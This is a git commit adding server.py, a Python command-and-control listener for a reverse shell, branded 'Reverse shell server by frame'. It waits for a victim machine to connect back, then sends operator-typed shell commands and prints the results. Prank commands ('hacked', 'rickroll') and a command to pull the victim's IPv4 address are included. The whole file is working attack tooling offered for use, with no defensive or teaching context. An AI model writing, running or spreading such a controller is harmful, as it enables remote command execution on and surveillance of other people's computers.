ad0642ce13d23d5e5d80fa9cf5dd3ba91addf2b5
Frame <109004138+FrameRoot@users.noreply.github.com>
2022-12-31 15:07:33 +0000

    Create server.py

---
+++ server.py
@@ -0,0 +1,78 @@
+import socket 
+import pystyle 
+from pystyle import Colorate, Colors
+import os
+import random
+import time
+import ctypes
+
+times = 5000
+
+def main():
+    os.system('cls')
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ctypes.windll.kernel32.SetConsoleTitleW(" Reverse shell server by frame ")
+    print(Colors.green,f"""
+_____ _____ _____ _____ _____ ______
+|   __|   __| __  |  |  |   __| __  |
+|__   |   __|    -|  |  |   __|    -|
+|_____|_____|__|__|\___/|_____|__|__|
+                            {Colors.white}Maded by frame 
+                            """)
+    ip = input(Colors.white+" HOST IP (default: 127.0.0.1): "+Colors.green) 
+    port = int(input(Colors.white+" HOST PORT (default: 8080): "+Colors.green))
+    s.bind((f"{ip}", port))
+    s.listen(5)
+    print("")
+    print (f' {Colors.white}{Colors.white}[{Colors.green}+{Colors.white}] Listening on port {port}')
+    
+    conn, addr = s.accept() 
+    time.sleep(0.1)
+    #client_ip = conn.recv(1024).decode()
+    print (f' {Colors.white}[{Colors.green}+{Colors.white}] Connection From: {Colors.green}', addr)
+    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Starting session ...')
+    time.sleep(2)
+    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Session Started!')
+    time.sleep(0.1)
+    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Stabilizing command prompt ...')
+    time.sleep(2)
+    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Stabilized!')
+    time.sleep(0.5)
+    print()
+    while True:
+        command = input(f"{Colors.green} Shell {Colors.white}> ")
+        conn.send(command.encode())
+        if command.lower() == "kill":
+            print(f' {Colors.white}[{Colors.red}-{Colors.white}] Server was killed')
+            break
+        #else:
+            #results = conn.recv(1024).decode()
+            #print(results)
+        if command == "message":
+            message = input("Message: ")
+            s.send(message.encode())
+        if command.lower() == "hacked":
+            print("")
+            print(f" {Colors.white}[{Colors.green}+{Colors.white}] Warn sended!")
+            print("")
+        else:
+            print("")
+            print(f" {Colors.white}[{Colors.green}+{Colors.white}] OS LOG:")
+            print("------------------------------------------------------------------------")
+            results = conn.recv(1024).decode()
+            print(results)
+            print("------------------------------------------------------------------------")
+
+        if command.lower() == "ipv4":
+            final = conn.recv(1024).decode()
+            print("")
+            print(f"{Colors.white} IPV4: {Colors.green}",final)
+            print("")
+        if command.lower() == "rickroll":
+            print("")
+            print(f" {Colors.white}[{Colors.green}+{Colors.white}] RICKROLLED")
+            print("")
+
+
+
+main()# you dont readlly need to define this but i just like to do because of the compiled languages
